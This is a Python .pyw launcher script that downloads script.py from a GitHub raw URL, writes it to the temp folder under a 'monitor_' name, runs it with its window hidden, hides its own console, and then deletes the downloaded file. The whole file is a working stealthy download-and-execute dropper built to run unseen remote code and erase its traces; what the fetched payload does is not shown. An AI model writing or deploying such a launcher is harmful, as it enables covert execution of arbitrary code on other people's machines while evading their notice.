# github_launcher.pyw - Downloads and runs script.py from temp, then deletes it
import os
import sys
import subprocess
import urllib.request
import tempfile
import time
import traceback
import atexit

def delete_temp_file(temp_script_path):
    """Try to delete the temp file with retries"""
    if not temp_script_path or not os.path.exists(temp_script_path):
        return
    
    # Try multiple times to delete the file
    for attempt in range(10):
        try:
            time.sleep(1)  # Wait a bit before trying
            os.remove(temp_script_path)
            print(f"Successfully deleted temp file on attempt {attempt + 1}")
            return True
        except (PermissionError, OSError) as e:
            if attempt < 9:
                print(f"Attempt {attempt + 1} failed, retrying...")
                continue
            else:
                print(f"Failed to delete temp file after 10 attempts")
                return False
        except Exception as e:
            print(f"Error deleting file: {e}")
            return False

def run_script_from_github():
    """Download script.py from GitHub, run it, then delete temp file"""
    temp_script = None
    try:
        # URL to script.py on GitHub
        script_url = "https://raw.githubusercontent.com/ElianBoden/Deployer/main/script.py"
        
        print("Downloading script from GitHub...")
        
        # Download the script
        response = urllib.request.urlopen(script_url, timeout=10)
        script_code = response.read().decode('utf-8')
        
        # Save to temp file with random name
        temp_dir = tempfile.gettempdir()
        timestamp = str(int(time.time()))
        temp_script = os.path.join(temp_dir, f"monitor_{timestamp}.py")
        
        # Write script to temp file
        with open(temp_script, 'w', encoding='utf-8') as f:
            f.write(script_code)
        
        print(f"Script saved to: {temp_script}")
        
        # Register cleanup function
        atexit.register(delete_temp_file, temp_script)
        
        # Run it hidden
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        
        process = subprocess.Popen(
            [sys.executable, temp_script],
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        print(f"Script started with PID: {process.pid}")
        
        # Try to delete the temp file after a delay
        time.sleep(3)
        delete_temp_file(temp_script)
        
        return True
        
    except Exception as e:
        print(f"Error: {e}")
        traceback.print_exc()
        # Clean up temp file if we created it but failed to run
        if temp_script and os.path.exists(temp_script):
            try:
                os.remove(temp_script)
            except:
                pass
        return False

def main():
    """Main launcher function"""
    # Hide console if possible
    try:
        import win32gui
        import win32con
        hwnd = win32gui.GetForegroundWindow()
        win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
    except:
        pass
    
    # Wait for network
    time.sleep(3)
    
    # Run the script
    success = run_script_from_github()
    
    # Keep launcher alive for a bit to ensure cleanup runs
    time.sleep(5)
    
    # Exit
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()
